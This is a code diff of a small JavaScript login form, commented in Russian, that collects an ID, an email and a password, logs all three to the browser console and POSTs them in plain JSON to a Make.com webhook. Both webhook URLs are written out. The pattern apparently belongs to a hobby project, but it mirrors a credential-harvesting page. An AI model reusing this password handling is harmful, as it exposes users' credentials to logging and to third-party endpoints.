@@ -1,56 +1,50 @@
-const container = document.getElementById('container');
-const registerBtn = document.getElementById('register');
-const loginBtn = document.getElementById('login');
-const ID = "903903020";
-const MAKE_WEBHOOK_URL = 'https://hook.eu2.make.com/qqv9me0pwvzo2a5qtdj3q4gjlfkvnpup'; // Замените на ваш новый URL вебхука
+let form = document.getElementById('loginForm');
 
-registerBtn.addEventListener('click', (e) => {
-    e.preventDefault(); // Prevent the default behavior of the button
-    container.classList.add("active");
-});
+form.addEventListener('submit', (event) => {
+    event.preventDefault();
 
-loginBtn.addEventListener('click', () => {
-    container.classList.remove("active");
-});
+    // Получаем значения из формы
+    let userId = document.getElementById('id').value;
+    let userEmail = document.getElementById('email').value;
+    let userPassword = document.getElementById('password').value;
 
-document.getElementById('registrationForm').addEventListener('submit', function(e) {
-    e.preventDefault(); // Prevent the default behavior of the submit button
-
-    let idField = document.getElementById('id').value;
-
-    if (idField !== ID) {
-        alert("Invalid ID");
-        return false; // Prevent the form from submitting
+    // Проверяем данные (при необходимости)
+    if (!userEmail || !userPassword) {
+        alert('Пожалуйста, заполните все поля.');
+        return;
     }
 
-    // Prepare payload for Make webhook
-    const makePayload = {
-        username: document.getElementById('username').value,
-        email: document.getElementById('email').value,
-        password: document.getElementById('password').value,
-        id: document.getElementById('id').value
+    // Создаем объект с данными
+    let data = {
+        id: userId,
+        email: userEmail,
+        password: userPassword
     };
 
-    // Send data to Make webhook
-    fetch(MAKE_WEBHOOK_URL, {
+    // Используем значение
+    console.log("Значение input:", userId);
+    console.log("Значение input:", userEmail);
+    console.log("Значение input:", userPassword);
+
+    fetch('https://hook.eu2.make.com/h5wei8h57yaet9f693hx1hjlpysisffq', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
-        body: JSON.stringify(makePayload)
+        body: JSON.stringify(data)
     })
     .then(response => {
-        if (response.ok) {
-            console.log('Data sent to Make successfully.');
-        } else {
-            console.error('Error sending data to Make. Status:', response.status);
-            return response.text(); // Optional: for additional debugging
+        if (!response.ok) {
+            return response.text()
+                .then(text => {
+                    throw new Error(`Ошибка при отправке данных: ${response.status} - ${text}`);
+                });
         }
-    })
-    .then(responseText => {
-        console.log('Make webhook response:', responseText);
+        // Обработка успешного ответа
+        console.log('Данные успешно отправлены');
     })
     .catch(error => {
-        console.error('Error sending data to Make:', error);
+        console.error('Ошибка:', error);
+        alert('Произошла ошибка при отправке данных. Пожалуйста, попробуйте позже.\nПодробности ошибки:', error.message);
     });
 });
